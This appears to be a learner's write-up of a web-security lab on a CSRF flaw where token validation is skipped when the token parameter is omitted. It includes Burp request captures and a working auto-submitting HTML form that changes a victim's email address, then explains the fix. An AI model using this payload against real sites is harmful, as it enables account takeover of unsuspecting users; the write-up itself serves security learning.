## Lab 03: CSRF Where Token Validation Depends on Token Being Present
 
**Technique:** CSRF by omitting the CSRF token entirely
**Target:** Email change functionality
**Status:** Solved
 
### Context
 
The application used CSRF tokens but the validation logic only ran when the `csrf` parameter was actually present in the request. If you left the parameter out entirely, the server skipped validation and processed the request anyway.
 
### What I Did
 
Logged in, changed email, caught the POST in Burp:
 
```
POST /my-account/change-email
 
email=test1@gmail.com
csrf=abc123xyz
```
 
In Repeater I first swapped the token for a fake value. Server rejected it. So the token was being checked when present.
 
Then I removed the `csrf` parameter from the body completely:
 
```
POST /my-account/change-email
 
email=test1@gmail.com
```
 
Server accepted it and changed the email. The validation code was gated on the presence of the parameter. No parameter, no check.
 
The exploit payload was the same as Lab 01, a basic POST form with no CSRF field at all:
 
```html
<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="victim@attacker.net">
</form>
 
<script>
document.forms[0].submit();
</script>
```
 
Stored it, verified, delivered to victim. Lab solved.
 
### Why This Works
 
The server code probably checked something like "if csrf token is present, validate it." The missing case was "if csrf token is absent, also reject the request." So an attacker just needs to not send the parameter and the whole defence collapses. Good CSRF validation should reject requests that are missing the token, not just requests that have a wrong one.
 
---
 
